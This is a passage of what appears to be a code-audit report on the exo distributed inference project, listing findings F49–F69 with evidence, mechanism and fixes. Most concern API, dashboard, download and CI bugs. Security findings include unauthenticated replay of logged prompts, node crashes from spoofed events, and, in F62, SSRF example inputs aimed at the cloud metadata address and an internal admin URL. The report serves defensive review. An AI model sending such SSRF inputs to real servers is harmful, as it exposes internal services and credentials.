**Fix.** Drain first, then check closed: in `receive_nowait`/`receive`, attempt `buffer.get` and raise `ClosedResourceError` only when the buffer is empty and `closed` is set (the `_MpEndOfStream` sentinel already provides ordered EOF). Make `collect()` swallow EndOfStream/ClosedResourceError and return what it has. Add a test that sends N items and closes with no delay, asserting all N arrive.

### F49 — API DiskEventLog persists every prompt, generated token and uploaded image to ~/.exo/event_log/api in plaintext with 5 rotations, and GET /events replays it unauthenticated

*`src/exo/api/main.py:1972` — medium · effort S · finder-reported · lens `security` · confidence 0.90*

**Evidence.** `_apply_state` does `self._event_log.append(i_event.event)` for every `IndexedEvent` (main.py:1972) before dispatching `ChunkGenerated` to queues (1976-1990). `DiskEventLog` writes length-prefixed msgpack of `event.model_dump(mode="json")` (disk_event_log.py:23-24), rotates the previous file to `events.<ts>.bin.zst` on open/close and keeps `_MAX_ARCHIVES = 5` (20, 164-187). `stream_events` (main.py:1013-1027) streams `self._event_log.read_all()` (138-148) as a JSON array on `GET /events` with no auth. The master keeps a parallel log under `event_log/master`.

**Mechanism.** Every chat via any node's API (OpenAI/Claude/Ollama/Responses clients, including third-party tools such as Claude Code or Open WebUI configured against exo) is durably recorded — messages, system prompts, tool arguments, base64 images, and every output token — even at default verbosity. Anyone with LAN access to port 52415, or any web page via CORS, can pull the full history with one GET; the files also outlive the session on disk and are shipped by the bug reporter.

**Fix.** Redact before persisting: in `_apply_state`, skip `ChunkGenerated`/`InputChunkReceived` and store `TaskCreated` with `task_params` replaced by a summary (model, token counts), or make full-payload logging opt-in via `EXO_EVENT_LOG_FULL=1`. Remove `GET /events` from the production route table (keep it behind the API key or a debug flag). Add an `EXO_EVENT_LOG_RETENTION` and set `_MAX_ARCHIVES` from it. Create the log directory with mode 0700.

### F50 — Responses API never reports incomplete/max_output_tokens: finish_reason is discarded

*`src/exo/api/adapters/responses.py:813` — medium · effort S · finder-reported · lens `api-compat` · confidence 0.90*

**Evidence.** Neither collect_responses_response (responses.py:397-475) nor generate_responses_stream (478-821) reads `chunk.finish_reason` — the only per-chunk checks are ErrorChunk, ToolCallChunk and `is_thinking`. Both unconditionally build `ResponsesResponse(status="completed")` (470, 813) and the stream always ends with `ResponseCompletedEvent` (818-821). `ResponsesResponse` (openai_responses.py:432-442) has no `incomplete_details`; `ResponseStatus` (line 18) does include "incomplete" but it is never used.

**Mechanism.** A request truncated by max_output_tokens (TokenChunk.finish_reason == "length") is reported as `status: "completed"` with no `incomplete_details`. Codex and other Responses clients use `incomplete_details.reason == "max_output_tokens"` to decide whether to continue generation or warn the user; against exo they silently accept the truncated text as final.

**Fix.** Track `finish_reason` across chunks in both functions. When it is "length", set `status="incomplete"`, `incomplete_details={"reason": "max_output_tokens"}` (add the field to ResponsesResponse) and, in streaming, emit `response.incomplete` instead of `response.completed`.

### F51 — config.toml is created, read, broadcast cluster-wide, and then discarded; any key in it is rejected

*`src/exo/utils/info_gatherer/info_gatherer.py:295` — medium · effort S · finder-reported · lens `dead-code-drift` · confidence 0.90*

**Evidence.** info_gatherer.py:295-310: `class NodeConfig(TaggedModel)` has no fields; `gather()` does `await cfg_file.parent.mkdir(...)`, `await cfg_file.touch(exist_ok=True)`, `tomllib.loads(contents)`, `cls.model_validate(data)` and on ValidationError logs 'Invalid config file, skipping...'. TaggedModel inherits `extra="forbid"` (src/exo/utils/pydantic_ext.py:11-18), so any non-empty TOML fails validation. It is sent once at startup (info_gatherer.py:458-460) as a NodeGatheredInfo event, and the reducer drops it: src/exo/shared/apply.py:375-376 `case NodeConfig(): pass`. README.md:221 advertises 'Configuration files: ~/.config/exo/'. src/exo/shared/models/model_cards.py:36 still says '# TODO: load search path from config.toml'.

**Mechanism.** Every node writes an empty ~/.config/exo/config.toml on first start. A user who reads README and puts e.g. `namespace = "lab"` or a models path into it sees a warning 'Invalid config file, skipping...' and no behaviour change. When it does parse (empty file) the result is serialised, published on the event bus, indexed by the master, appended to the on-disk event log on every node, and ignored. The surface promises a config mechanism that does not exist.

**Fix.** Either delete `NodeConfig` (and its arm in `GatheredInfo`, `apply.py:375`, and the README file-location line) so no config.toml is created, or make it real: give NodeConfig the fields the codebase already wants from config (custom card search paths per model_cards.py:36, namespace, models dirs) and have `apply` store it in State. Do not touch/create the file until it has a schema.

### F52 — docs/api.md and README describe an API file that does not exist and omit 17 live routes; several documented values disagree with code

*`docs/api.md:5` — medium · effort S · finder-reported · lens `dead-code-drift` · confidence 0.90*

**Evidence.** docs/api.md:3-5 and README.md:536 cite `src/exo/master/api.py`; `ls src/exo/master/` shows only image_store.py, main.py, placement.py, placement_utils.py. The route table in src/exo/api/main.py:344-409 registers routes absent from docs/api.md §7: `/v1/instance-links` (GET/POST) and `/v1/instance-links/{link_id}` (PUT/DELETE), `/v1/feature-flags`, `/ollama/v1/chat/completions`, `/state/{path}`, `/download/start`, `/download/{node_id}/{model_id}`, `/download/cancel`, `/v1/traces`, `/v1/traces/delete`, `/v1/traces/{task_id}`, `/v1/traces/{task_id}/stats`, `/v1/traces/{task_id}/raw`, `/onboarding` (GET/POST). docs/api.md:497-503 says `/ollama/api/version` returns `{"version": "exo v1.0"}`; code returns `{"version": "1.0.0"}` (api/main.py:1773-1775). README.md:323 documents EXO_FAST_SYNCH default as 'Auto', but bootstrap.py:53-57 sets MLX_METAL_FAST_SYNCH=1 unless the value is literally "false". README.md:192 offers `--extra mlx-cuda13 / mlx-cuda12` and `Backend.MlxCuda` exists (src/exo/shared/types/backends.py:7, info_gatherer.py:380-382) while README.md:201 and 588 state 'Currently, exo runs on CPU on Linux'.

**Mechanism.** A newcomer or an API client author reads docs/api.md, finds no file at the cited path, and never learns about the download-control, trace, onboarding or instance-link endpoints — the ones the dashboard actually drives. Anyone matching on the documented Ollama version string gets a mismatch. Linux users get two contradictory answers about GPU support on the same page.

**Fix.** Fix the path to `src/exo/api/main.py` in both files; regenerate docs/api.md §7 from the route table (a 20-line script over `_setup_routes` would keep it honest) and document the missing endpoints; correct the Ollama version example; change the EXO_FAST_SYNCH default to 'on unless set to false'; reconcile the Linux GPU statements with the CUDA extras and Backend.MlxCuda. Add EXO_ZENOH_NAMESPACE to the env table and drop EXO_LIBP2P_NAMESPACE.

### F53 — Pidfile.close() deletes the PID file, the opposite of its documented and upstream semantics

*`rust/exo_rs/src/pidfile.rs:118` — medium · effort S · finder-reported · lens `rust-transport` · confidence 0.90*

**Evidence.** pidfile.rs:117-120: `fn close(&mut self) { self.0 = None; }`. Dropping the inner value runs pidfile-rs `impl Drop for Pidfile` (vendored lib.rs:193-208) which, with `autoremove` still true, calls `remove_file(&self.path)`. Upstream `Pidfile::close(mut self)` (lib.rs:166-171) instead sets `self.autoremove = false` so the file survives. The binding's docstring (pidfile.rs:49-51, mirrored in exo_rs.pyi:72-74) still promises: "To close the PID file without deleting it, for example, in the parent process of a forked daemon, call `close()`." main.py:284-330 calls `pidfile.close()` in a `finally` around both the daemon and foreground paths; the daemon parent only avoids it because python-daemon `os._exit`s after forking.

**Mechanism.** Any caller that follows the docstring (e.g. a parent that daemonises without os._exit, or a future refactor of main.py) unlinks the child's lock file while the child is running; a second `exo` then creates a fresh file, acquires a fresh flock, and starts a second node on the same ports. Also, get()/get_mut() (pidfile.rs:61-73) `.expect(...)` after close, so `write()`/`as_raw_fd()` on a closed Pidfile raise `pyo3_runtime.PanicException` (a BaseException) rather than PidfileError.

**Fix.** Implement `close()` as `if let Some(p) = self.0.take() { p.close() }` (keep file, release handle), add an explicit `remove()`/`__exit__` that drops with autoremove, and have get()/get_mut() return `Err(PyPidfileError(...))` on a closed handle. Regenerate exo_rs.pyi so the stub matches.

### F54 — Regenerate rebuilds the API request without attachments, images, temperature or enable_thinking, so it answers a different prompt than the original

*`dashboard/src/lib/stores/app.svelte.ts:1912` — medium · effort S · finder-reported · lens `dashboard` · confidence 0.90*

**Evidence.** `regenerateChatCompletion` builds `apiMessages` as `...targetConversation.messages.slice(0, -1).map((m) => { const out = { role: m.role, content: m.content }; ... })` (1912-1922) and posts `{ model, messages, stream: true, logprobs: true, top_logprobs: 5 }` (1945-1951). `sendMessage` for the same history appends `[File: ...]` text attachments and builds OpenAI `image_url` parts for images/PDF pages (2409-2490) and sends `temperature: 0.7` plus `enable_thinking` (2522-2530). `regenerateFromToken` at least appends text attachments (1690-1700).

**Mechanism.** User uploads a PDF or image, asks a question, clicks 'Regenerate response' (ChatMessages.svelte:739-758) or edits the prompt: the model receives only the bare question with no document/image and no thinking flag, producing an answer that ignores the attachment and uses different sampling than the first reply — with no indication that the request differed.

**Fix.** Extract one `buildApiMessages(messages: Message[])` (the multimodal builder currently inline in `sendMessage`) and one `buildChatRequestBody(modelId, messages, enableThinking)`; use them in `sendMessage`, `regenerateChatCompletion`, and `regenerateFromToken`. Persist `enableThinking` on the conversation (it already exists as `conversation.enableThinking`) and pass it on regenerate.

### F55 — Periodic rescan queries the HF tree API for every one of the 141 catalog cards, including models the user never requested, with 5 retries each when offline

*`src/exo/download/impl_shard_downloader.py:260` — medium · effort S · finder-reported · lens `download` · confidence 0.90*

**Evidence.** coordinator.py:360-363 `async for _, progress in self.shard_downloader.get_shard_download_status()` every 60 s (:475). impl_shard_downloader.py:260-263 `tasks = [create_task(download_with_semaphore(model_card)) for model_card in await model_cards.card_cache.list_all()]` (123 inference + 18 image cards in resources/). :168-173 `download_shard(shard, _noop, skip_download=True, skip_internet=self.offline)`. download_utils.py:889-897 calls `fetch_file_list_with_cache(...)` before any local-directory check; :402 `if skip_internet:` only when `--offline`; on a cache miss :419 -&gt; `fetch_file_list_with_retry` :460-481 does 5 attempts with `asyncio.sleep(2.0**attempt + random.uniform(0, 1))` and a 30 s total timeout per attempt (:538-542). :389 `ensure_cache_dir(model_id)` also mkdirs `caches/<model>` for every card.

**Mechanism.** Fresh install with no models: at startup every node fires 141 `GET /api/models/<id>/tree/main?recursive=true` requests (8 in parallel) purely to report 'not_started' for models nobody asked for, and repeats once the 24 h TTL expires — the exact rate-limit exposure that #2009 tried to reduce (HF limit is 500/5 min per the captured header). On a LAN without internet (but not started with --offline), each card costs up to 5 x 30 s of timeouts; 141/8 x ~17 s of backoff (fast DNS failure) is ~5 min per rescan, up to ~44 min if packets are black-holed, during which `_start_download`'s own `get_shard_download_status_for_shard` call (:234-236) is competing for the same network. Also leaves 141 empty `caches/` dirs on disk.

**Fix.** In `_status_for_shard`/`download_shard(skip_download=True)`, short-circuit when no directory exists for the model in any of `EXO_MODELS_READ_ONLY_DIRS + EXO_MODELS_DIRS`: return `not_started` with `total=card.storage_size` without touching the network or creating a cache dir. Only fetch the file list for models that have a local directory (partial or complete). Additionally add a negative cache (e.g. a `--failed_at` marker) so a card whose tree fetch failed is not retried on every 60 s rescan.

### F56 — Rescan re-emits an identical DownloadCompleted event for every downloaded model every 60 s; master journals and broadcasts each one

*`src/exo/download/coordinator.py:431` — medium · effort S · finder-reported · lens `download` · confidence 0.90*

**Evidence.** coordinator.py:370-386: `if progress.status == "complete": ... status = self._completed_from_path(...)` with no comparison to the existing entry; :431-434 `self.download_status[progress.shard.model_card.model_id] = status; await self.event_sender.send(NodeDownloadProgress(download_progress=status))` runs unconditionally. The 'don't downgrade' guard at :390-393 exists only in the `in_progress`/`not_started` branch. master/main.py:519-523: every indexed event is `self._event_log.append(event)` (DiskEventLog) and `await self._send_indexed_event(indexed)`; apply.py:139-168 always replaces the entry. Each event embeds the full ShardMetadata+ModelCard (shards.py:21, model_cards.py:157-177: ~20 fields incl. sampling_defaults).

**Mechanism.** A 5-node cluster with 10 downloaded models generates 50 no-op NodeDownloadProgress events per minute (~72k/day, ~1 KB each) that are appended to the master's on-disk event log, re-broadcast to every node, applied into State on every node (a `State.model_copy` each), and re-serialized by the API's state endpoint. On nodes where the models' text files drifted from HF sizes the emit is skipped (:390-393), so the behaviour is inconsistent between models, which makes it hard to notice.

**Fix.** Before assigning at :431, compare with `self.download_status.get(model_id)`: skip the send when the existing entry is already a `DownloadCompleted` with the same `model_directory`/`read_only`/`total` (or more simply, when `existing == status` after normalising node_id). Apply the same check to the read-only scan at :441-466. Add a coordinator test asserting a second rescan of an unchanged completed model emits zero events.

### F57 — Python tests run only on macOS and are absent from `nix flake check`; Linux code paths are neither executed nor type-checked in CI

*`.github/workflows/pipeline.yml:107` — medium · effort M · merged into F19 · lens `build-deps` · confidence 0.90*

Duplicate of F19, kept for readers arriving from the `build-deps` lens.

**Evidence.** pipeline.yml:106-117 `- name: Run pytest (macOS only)` / `if: runner.os == 'macOS'` ... `$TEST_ENV/bin/python -m pytest src -m "not slow"`. python/parts.nix:288-300 `checks = { lint = ...ruff check...; typecheck = ...basedpyright... }` — no pytest derivation, so :104 `nix flake check` never runs Python tests on any system. pyproject.toml:152 `pythonPlatform = "Darwin"` makes basedpyright treat `sys.platform == "linux"` branches as unreachable. Linux runners (:19-23) build `packages.exo` and `exo-cuda-13` (python/parts.nix:274-286) but never import them.

**Mechanism.** Any regression confined to Linux (info gatherer shell-outs, mlx-cpu/cuda import, `python-daemon` paths, the mlx/mlx-cpu version mismatch above) merges green: ubuntu jobs only prove the closure builds. A developer on macOS cannot see Linux type errors either, since pyright is told the platform is Darwin. Users of the documented Linux paths (README:192-196, `nix run .#exo`) are the first to execute that code.

**Fix.** Add `checks.pytest = pkgs.runCommand "pytest" { nativeBuildInputs = [ testVenv ]; } ''export HOME=$TMPDIR EXO_TESTS=1; cd ${inputs.self}; pytest src -m "not slow" --import-mode=importlib; touch $out''` in python/parts.nix (mark GPU-dependent tests `slow`/skipped under sandbox), so all three matrix systems run tests via `nix flake check`. Run basedpyright twice in `checks.typecheck` (`--pythonplatform Darwin` and `--pythonplatform Linux`).

### F58 — OrderedBuffer.ingest asserts on index collision; inside EventRouter._run_ext_in that assertion kills the whole process on one bad GlobalForwarderEvent

*`src/exo/utils/event_buffer.py:22` — medium · effort S · finder-reported · lens `control-plane` · confidence 0.85*

**Evidence.** event_buffer.py:21-25: `if idx in self.store: assert self.store[idx] == t, "Received different messages with identical indices, probable race condition"`. Called unguarded from event_router.py:125 `buf.ingest(event.origin_idx, event.event)`; an AssertionError there ends `_run_ext_in`, the EventRouter TaskGroup raises into Node `_tg` (main.py:156-170) and `main_inner` (main.py:369-374) exits the process. The only fencing before ingest is `event.session != self.session_id` / `event.origin != master_node_id` (120-123) on plain wire fields (events.py:182-188) with no authentication. `test_ingest_drops_duplicate_indices` (routing/tests/test_event_buffer.py:91-100) codifies the raise.

**Mechanism.** Any peer able to publish on GLOBAL_EVENTS (rogue LAN device, a buggy or mis-versioned node, or a future master defect) that sends an event carrying the current master's node id and session at an index already buffered with different content crashes every node that has that index in `store`. Under `python -O` the same input instead silently keeps whichever payload arrived first, so behaviour differs by interpreter flags.

**Fix.** Change `ingest` to return `bool`/log at error and drop the colliding payload (keep the first), never assert; have `_run_ext_in` count and log collisions. Update the existing test to expect drop-not-raise and add an EventRouter test that a colliding event does not terminate `run()`.

### F59 — Instance retry cap is a lifetime counter that increments on every node per crash and is never reset on success, so the 5th recoverable crash ever deletes the instance

*`src/exo/worker/main.py:213` — medium · effort S · verified · lens `worker-runner` · confidence 0.85*

**Evidence.** main.py:211-223 `if self._instance_backoff.attempts(iid) >= EXO_MAX_INSTANCE_RETRIES: ... DeleteInstance(instance_id=iid)`; 233 `self._instance_backoff.record_attempt(task.instance_id)` on every CreateRunner; the only `reset` is main.py:147-148 on `InstanceDeleted` (already terminal). keyed_backoff.py:23-35 `record_attempt` only increments; `reset` docstring says 'e.g., on success' but no success path calls it. constants.py:108 `EXO_MAX_INSTANCE_RETRIES = 5`. plan.py:94-100 shuts down healthy siblings when any runner is RunnerFailed, so each node re-creates its runner (and increments its own counter) for every crash anywhere in the instance.

**Mechanism.** A two-node instance that has served traffic for days accumulates one attempt per node per recoverable crash (Metal GPU timeout, request-induced OOM, ring socket error). On the fifth such event both nodes hit the cap simultaneously and each sends DeleteInstance; the model disappears from the cluster without any crash loop having occurred, and the user must re-place it. The 10 s backoff cap already handles genuine crash loops, so the lifetime cap only punishes long-lived instances.

**Fix.** Reset the counter on success: call `_instance_backoff.reset(instance_id)` when the local runner publishes `RunnerReady` (observe it in `_forward_events` or in `_event_applier`), or add time-decay to `KeyedBackoff` so attempts older than a window are forgotten; keep the cap purely as a crash-loop guard.

### F60 — Patched GenerationBatch._step feeds logits processors a history missing the current token and rebuilds it from a Python list every step

*`src/exo/worker/engines/mlx/patches/opt_batch_gen.py:75` — medium · effort S · finder-reported · lens `mlx-engine` · confidence 0.85*

**Evidence.** opt_batch_gen.py:70-77: `for processor in self.logits_processors[e]: sample_logits = processor(mx.array(self.tokens[e]), sample_logits)`; `self.tokens[e]` is only appended with the current input at 126-128, after the forward pass. Upstream (pinned mlx_lm generate.py, `GenerationBatch._step`) does `token_context = [tc.update_and_fetch(inputs[i:i+1]) ...]` and passes `token_context[e]`, where `TokenBuffer.update_and_fetch` (cache.py:1503-1514) appends the input token before returning. The single-request path (`generate_step`, `tokens = mx.concat([tokens, input_tokens])`) also includes the current token. exo's patch never touches `self._token_context`.

**Mechanism.** With `repetition_penalty`, `presence_penalty` or `frequency_penalty` set, the batch engine penalises a window that lags one token behind: the token just sampled is not penalised on the very next step, so immediate repeats slip through, and results differ from the same request run through `SequentialGenerator` (EXO_NO_BATCH). Separately, `mx.array(self.tokens[e])` converts the entire prompt+generation list (tens of thousands of ints at long context) to an array for every row on every decode step, adding O(context) host work per token whenever any processor is active.

**Fix.** Restore upstream semantics inside `_patched_step`: `token_context = [tc.update_and_fetch(inputs[i:i+1]) for i, tc in enumerate(self._token_context)]`, pass `token_context[e]` to the processors, and include `token_context` in the `mx.async_eval(...)` call. Add a regression test comparing the penalised logits of one step from `ExoBatchGenerator` against `generate_step` with the same history.

### F61 — Instance deletion (node loss or user delete) closes generation streams with no error: SSE clients get a silent truncation, non-streaming clients get a 200 with partial text or a bare 500 from an assert

*`src/exo/api/main.py:2006` — medium · effort S · finder-reported · lens `resilience` · confidence 0.85*

**Evidence.** api/main.py:1996-2010 `_close_streams_for_instance`: `if sender := self._text_generation_queues.pop(task.command_id, None): sender.close()` — no `ErrorChunk` is enqueued. `_token_chunk_stream` :766-773 then simply exits its `async for`. chat_completions.py:218-293 `generate_chat_stream` only emits `data: [DONE]` on `finish_reason`/`ErrorChunk`/tool call, so the SSE stream just ends mid-response; :295-362 `collect_chat_response` returns `finish_reason=None` with whatever text arrived, and `assert model is not None` (:360) raises `AssertionError` (generic 500, no message) if no token had arrived yet. Both the master's node-loss path (master/main.py:474-481) and the user path (:357-370) end here. Contrast supervisor.py:408-423 `_check_runner`, which does emit an `ErrorChunk` with diagnostics when a runner crashes.

**Mechanism.** A peer node dies mid-generation. ~40-50 s later the master emits `InstanceDeleted`; the API closes the stream. A streaming client sees the connection close without `[DONE]` (OpenAI SDK: `APIConnectionError`/incomplete read, no reason); a non-streaming client that already received some tokens gets HTTP 200 with a truncated answer and `finish_reason: null` — indistinguishable from success; one that received nothing gets a contentless 500. Nothing tells the user or the logs why.

**Fix.** In `_close_streams_for_instance`, before `sender.close()`, `send_nowait` an `ErrorChunk(model=task.task_params.model, error_message=f"instance {instance_id} was deleted (node lost or instance removed)", finish_reason="error", diagnostics=[])` for text queues and the image equivalent, so the existing adapter error paths produce a proper 500 + `[DONE]`. Replace `assert model is not None` in `collect_chat_response` with an explicit `ValueError("stream ended before any token was produced")` so the failure has a message.

### F62 — image_url in chat/claude/responses requests is fetched server-side with no host restrictions or size cap, before the model is even validated (SSRF + memory DoS)

*`src/exo/api/adapters/chat_completions.py:49` — medium · effort S · finder-reported · lens `security` · confidence 0.85*

**Evidence.** `fetch_image_url` (chat_completions.py:49-57): `session.get(url, headers=headers)` with `create_http_session(timeout_profile="short")` (aiohttp, redirects followed by default), then `resp.raise_for_status(); data = await resp.read()` — no size limit, no content-type check, no IP filtering. It is called for any `http://`/`https://` URL at chat_completions.py:82 and 96, claude.py:97-102, responses.py:164-167. In `chat_completions` the adapter runs first (`task_params = await chat_request_to_text_generation(payload)`, main.py:920) and `_validate_model_has_instance` only afterwards (921), so the fetch happens even when no instance exists.

**Mechanism.** An unauthenticated caller (LAN or cross-site) posts `image_url: http://169.254.169.254/latest/meta-data/` or `http://10.0.0.5:8080/admin/reset` and the node issues the GET from its own network position; response status/timing leaks through the 500 vs success and latency. Or `image_url` pointing at a multi-GB file makes `resp.read()` allocate the whole body, then base64 it and chunk it onto the zenoh bus (`_send_text_generation_with_images`, main.py:846-905) — one request can exhaust memory on the API node and flood every peer.

**Fix.** In `fetch_image_url`: resolve the hostname, reject loopback/link-local/private/multicast ranges (`ipaddress.ip_address(...).is_private|is_loopback|is_link_local|is_reserved`), disable automatic redirects and re-validate each hop, require `Content-Type` starting with `image/`, enforce a cap (e.g. 20 MiB) by checking `Content-Length` and streaming `resp.content.iter_chunked` with a running total. Move `_validate_model_has_instance` before the adapter call in all four handlers. Consider an `EXO_ALLOW_REMOTE_IMAGE_URLS=false` default.

### F63 — Image dedup caches grow without bound: API never forgets sent hashes and every node's worker keeps every base64 image forever

*`src/exo/api/main.py:887` — medium · effort M · finder-reported · lens `performance` · confidence 0.85*

**Evidence.** api/main.py:260 `self._sent_image_hashes: set[str] = set()`; 885-888 `if h not in self._sent_image_hashes: self._sent_image_hashes.add(h)` - the only removal is `reset()` at 310 on a master change. Because a hash is 'sent' once for the API's lifetime, the worker must keep the payload: worker/main.py:94 `self.image_cache: dict[Base64ImageHash, Base64Image] = {}` is populated at 174-178 from `InputChunkReceived` and never popped (grep shows only reads at 204/345). `InputChunkReceived` is an indexed global event (master/main.py:396-402), so every node's worker, not just the one running the vision instance, assembles and retains every image.

**Mechanism.** Each distinct image sent to any vision chat endpoint is retained as a multi-MB base64 string on every node for the whole session. A few thousand images over a long-running session is several GB of RSS per node, competing with model weights in unified memory on Apple Silicon (which also shrinks `ram_available` and therefore future placements). If a future change did evict on the worker side, the API would still skip re-sending and the task would wait forever in `_pending_tasks` (plan.py:320-327).

**Fix.** Bound both sides with an LRU keyed by hash: API cap &lt;= worker cap, API touching a hash on every use and worker touching on every task use so recency order stays consistent; better, have the worker drop images once the consuming task completes and have it report a miss (an error/`ImageMissing` chunk) so the API resends instead of assuming permanence. Also only cache on nodes that host an instance for the task's model.

### F64 — Only HTTPException gets the OpenAI error envelope; validation and Ollama parse failures return 422 detail lists or plain-text 500

*`src/exo/api/main.py:320` — medium · effort S · finder-reported · lens `api-compat` · confidence 0.85*

**Evidence.** main.py:319-320 registers a single handler: `self.app.exception_handler(HTTPException)(self.http_exception_handler)`. FastAPI's default RequestValidationError handler therefore answers body/type errors with 422 `{"detail": [...]}`. The Ollama routes bypass FastAPI validation entirely: main.py:1615-1616 `body = await request.body(); payload = OllamaChatRequest.model_validate_json(body)` (same at 1651-1652, 1718-1719), so malformed JSON raises pydantic.ValidationError, which is not handled and becomes Starlette's plain-text 500. `fetch_image_url` (chat_completions.py:49-57) is awaited unguarded at 82/96 and responses.py:165, so a bad image URL also surfaces as a text/plain 500. The envelope itself uses `type=HTTPStatus(...).phrase` and int `code` (main.py:325-331, api.py:21-25) rather than OpenAI's `invalid_request_error` / string code.

**Mechanism.** An OpenAI client sending `max_tokens: "abc"` gets 422 with a `detail` array and no `error.message`; the SDK's error object has an empty message. `curl -d 'not json' /ollama/api/chat` gets `Internal Server Error` as text/plain with status 500, which Ollama clients report as a server crash rather than a bad request. Unreachable image URLs are reported as server failures instead of client errors.

**Fix.** Register handlers for `RequestValidationError` (return 400 with ErrorResponse: message from the first error, `type="invalid_request_error"`, `param` from `loc`), for `pydantic.ValidationError` (same, 400), and a catch-all `Exception` handler that returns the envelope with 500 and `type="server_error"`. Wrap the Ollama `model_validate_json` calls in try/except ValidationError -&gt; HTTPException(400). Wrap fetch_image_url callers in try/except aiohttp.ClientError -&gt; HTTPException(400, "invalid_image_url"). Consider `code: str | None` in ErrorInfo to match OpenAI.

### F65 — Chat Completions accepts response_format, tool_choice, n, logit_bias and silently ignores them

*`src/exo/api/adapters/chat_completions.py:151` — medium · effort S · finder-reported · lens `api-compat` · confidence 0.85*

**Evidence.** ChatCompletionRequest declares `n` (api.py:231), `response_format: dict[str, Any] | None` (233), `logit_bias` (227), `tool_choice` (247), `parallel_tool_calls` (248). chat_request_to_text_generation (chat_completions.py:151-178) copies only max_tokens/temperature/top_p/top_k/stop/seed/stream/tools/reasoning/logprobs/penalties/images. A repo-wide grep for `response_format`, `tool_choice`, `logit_bias`, `parallel_tool_calls` finds no other reader for the chat path (the `response_format` hits in main.py are the image `url|b64_json` field). TextGenerationTaskParams (text_generation.py:102-135) has no corresponding fields.

**Mechanism.** Structured-output clients (`response_format: {"type":"json_schema",...}` from instructor, LangChain with_structured_output, Vercel AI SDK `generateObject`) get free-form prose with HTTP 200 and then fail downstream parsing with no hint that the server ignored the parameter. `tool_choice: "required"` or a named tool has no effect, so agent frameworks that force a tool call get plain text and treat it as a refusal. `n: 3` returns one choice.

**Fix.** Until these are implemented, reject them explicitly so clients can adapt: in chat_completions raise HTTPException(400, type invalid_request_error, param="response_format") when `response_format.type` is not "text", when `tool_choice` is not None/"auto"/"none", when `n` &gt; 1, or when `logit_bias` is set. If `response_format: {type: "json_object"}` is wanted, at minimum inject a JSON-only system instruction and validate the output before returning.

### F66 — Deleting a conversation mid-stream abandons the reader without cancel/abort, so the backend keeps generating to completion

*`dashboard/src/lib/stores/app.svelte.ts:2163` — medium · effort S · finder-reported · lens `dashboard` · confidence 0.85*

**Evidence.** `parseSSEStream` loop: `const { done, value } = await reader.read(); if (done) break; if (!this.conversationExists(targetConversationId)) { break; }` (2159-2165) — no `reader.cancel()` and no abort. `deleteConversation(id)` (872-884) just filters `this.conversations`; it never calls `stopGeneration()`. `sendMessage`'s `finally` (2718-2724) then sets `isLoading = false`, so a second request can be started immediately.

**Mechanism.** User deletes the active chat while a long answer is streaming: the browser holds the HTTP response open with nobody reading it, the worker/runner keeps decoding tokens for the full response (minutes on large models), and the user can immediately start another generation, so two requests compete for the same instance. On the master side there is no signal that the client went away.

**Fix.** In `parseSSEStream`, call `await reader.cancel()` before `break`ing on conversation deletion; in `deleteConversation`/`deleteAllConversations`/`clearChat`, call `this.stopGeneration()` when `activeConversationId === id`. This makes the existing AbortController the single cancellation path.

### F67 — TopologyGraph destroys and rebuilds the entire SVG on every 1 Hz poll and on every hover, breaking tooltips and restarting the link animation

*`dashboard/src/lib/components/TopologyGraph.svelte:164` — medium · effort M · finder-reported · lens `dashboard` · confidence 0.85*

**Evidence.** `renderGraph()` begins with `d3.select(svgContainer).selectAll("*").remove();` (164) and appends defs, filters, clipPaths, ~20 elements per node and all text from scratch (179-1200). The `$effect` at 1203-1212 depends on `data` and `hoveredNodeId`. `data` is a new object every poll: `transformTopology` (app.svelte.ts:387-503) always builds fresh `nodes`/`edges` and stamps `last_macmon_update: Date.now() / 1000` (465). `.graph-link` uses `animation: flowAnimation 0.75s linear infinite` (1240). The per-node native tooltip is `nodeG.append("title")` (620-624). ResizeObserver also calls `renderGraph()` (1216-1218).

**Mechanism.** Every second the whole graph is torn down: the dashed-line 'flow' animation restarts from offset 0 (visible 1 Hz stutter), the `<title>` tooltip never appears because the element is removed before the browser's hover delay elapses, hovering a node triggers a full rebuild that replaces the element under the cursor (mouseenter/mouseleave churn), and with 8+ nodes plus debug labels this is hundreds of DOM allocations per second while the user is chatting.

**Fix.** Use keyed d3 joins: `nodesGroup.selectAll('g.graph-node').data(nodesWithPositions, d => d.id).join(enter => ..., update => ..., exit => exit.remove())` and update only attributes (memory fill height, GPU bar, text) on update. Split structural changes (node ids / edges / size / minimized) from metric updates, and have `transformTopology` return the previous object when node ids and edges are unchanged so `data` identity is stable.

### F68 — ModelCard._autodetect_vision validator performs synchronous filesystem I/O and mutates a frozen model on every validation, making cards environment-dependent

*`src/exo/shared/models/model_cards.py:179` — medium · effort M · finder-reported · lens `download` · confidence 0.85*

**Evidence.** model_cards.py:179-185: `@model_validator(mode="after") def _autodetect_vision(self): if self.vision is None: detected = detect_vision_from_config(self.model_id) ... object.__setattr__(self, "vision", detected)`. :98-112 `detect_vision_from_config` does `config_path.exists()`, `with open(config_path) as f: raw = json.load(f)` and `ConfigData.model_validate(raw, ...)` synchronously, iterating `EXO_MODELS_DIRS` only (not `EXO_MODELS_READ_ONLY_DIRS`). shards.py:21 `model_card: ModelCard` is embedded in every ShardMetadata, which is inside every NodeDownloadProgress, Instance and Task event deserialised by every node.

**Mechanism.** Every event containing a ShardMetadata (download progress — emitted per model per minute by the rescan — task creation, instance placement) triggers one stat per models dir plus a JSON parse of config.json on the event-loop thread of every node; with EXO_MODELS_DIRS on a network mount each becomes a blocking network stat in the hot event path. The same TOML card yields `vision=None` on a node that has not downloaded the model and `vision=VisionCardConfig(...)` on one that has, so `ModelCard`/`ShardMetadata` equality differs across nodes for the same instance, and `frozen=True` (FrozenModel) is bypassed with `object.__setattr__`. Pre-seeded vision models in read-only dirs are never autodetected.

**Fix.** Move detection out of the validator: perform it once, explicitly, in `ModelCard.load`/`load_from_path` (or when the download completes, via the coordinator) and store the result in the card that is written to disk/state, so validation is pure. Search read-only dirs as well. If autodetect must stay dynamic, do it in the engine at load time (where `fetch_config_data` already parses the same `vision` field) rather than in the shared wire type.

### F69 — Sparkle CLI tarball (a beta) is fetched without any integrity check and then handed the ED25519 private key

*`.github/workflows/build-app.yml:196` — medium · effort S · finder-reported · lens `build-deps` · confidence 0.85*

